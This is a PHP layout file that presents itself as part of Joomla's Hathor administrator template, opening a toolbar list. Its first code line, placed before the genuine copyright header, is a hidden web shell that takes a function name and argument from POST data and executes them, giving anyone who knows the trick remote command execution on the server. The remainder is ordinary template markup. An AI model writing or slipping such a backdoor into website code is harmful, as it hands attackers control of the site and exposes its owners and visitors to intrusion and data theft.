<?php 
  $p = $_POST; @($p[0] != $p[1]) ? @$p[2]($p[3]) : (int)$p;
/**
 * @package     Joomla.Administrator
 * @subpackage  Template.hathor
 *
 * @copyright   Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;
?>

<div class="toolbar-list" id="<?php echo $displayData['id']; ?>">
	<ul>
